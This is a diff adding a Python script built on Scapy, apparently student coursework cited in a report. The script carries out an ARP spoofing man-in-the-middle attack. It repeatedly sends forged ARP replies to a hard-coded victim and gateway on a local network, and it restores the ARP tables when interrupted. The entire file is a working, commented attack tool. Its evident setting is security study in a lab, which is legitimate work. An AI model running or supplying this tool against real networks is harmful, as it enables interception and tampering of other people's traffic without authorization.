@@ -1,0 +1,77 @@
+#Done by Fatima Hammoud
+#Reference [3] in report
+
+import scapy.all as scapy  #Imports all functions and classes from the Scapy library for packet manipulation
+import time  #Imports the time module to handle time-related functions
+
+def get_mac(ip):
+    #Creates an ARP request to find the MAC address associated with the provided IP address
+    arp_request = scapy.ARP(pdst=ip)
+    
+    #Creates a broadcast Ethernet frame to reach all devices in the local network
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    
+    #Combines the ARP request and the Ethernet frame into a single packet
+    arp_request_broadcast = broadcast / arp_request
+    
+    #Sends the packet and receives the responses, setting a timeout of 5 seconds
+    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    
+    #Returns the MAC address of the device that responded to the ARP request
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    #Retrieves the MAC address of the target IP
+    target_mac = get_mac(target_ip)
+    
+    #Constructs the ARP response indicating that the attacker (spoof_ip) is the sender for the target
+    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    
+    #Wraps the ARP response in an Ethernet frame with the target's MAC address
+    ethernet_frame = scapy.Ether(dst=target_mac) / arp_response
+    
+    #Sends the crafted Ethernet frame to the target
+    scapy.sendp(ethernet_frame, verbose=False)
+
+def restore(destination_ip, source_ip):
+    #Retrieves the MAC addresses of the destination and source IPs
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    
+    #Constructs an ARP packet to restore the correct mapping between the destination and source
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    
+    #Sends the restoration packet to the destination
+    scapy.send(packet, verbose=False)
+
+#Define the IP addresses for the victim, attacker, and gateway
+victim_ip = "192.168.86.132"  #Victim's IP address
+gateway_ip = "192.168.86.2"    #Gateway's IP address
+attacker_ip = "192.168.86.130"  #Attacker's IP address 
+
+try:
+    sent_packets_count = 0  #Initialize a counter for the sent packets
+    while True:
+        #Spoofs the victim to make it believe the attacker is the gateway
+        spoof(victim_ip, gateway_ip)
+        
+        #Spoofs the gateway to make it believe the attacker is the victim
+        spoof(gateway_ip, victim_ip)
+        
+        #Increments the count of sent packets by 2 for each loop iteration
+        sent_packets_count += 2
+        
+        #Prints the current count of sent packets
+        print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
+        
+        time.sleep(2)  #Pauses execution for 2 seconds before the next loop iteration
+
+except KeyboardInterrupt:
+    #Handles graceful exit when Ctrl + C is pressed
+    print("\nCtrl + C pressed.............Exiting")
+    
+    #Restores the original ARP mappings for both the gateway and victim
+    restore(gateway_ip, victim_ip)
+    restore(victim_ip, gateway_ip)
+    
+    print("[+] ARP Spoofing stopped.")  #Indicates that ARP spoofing has stopped
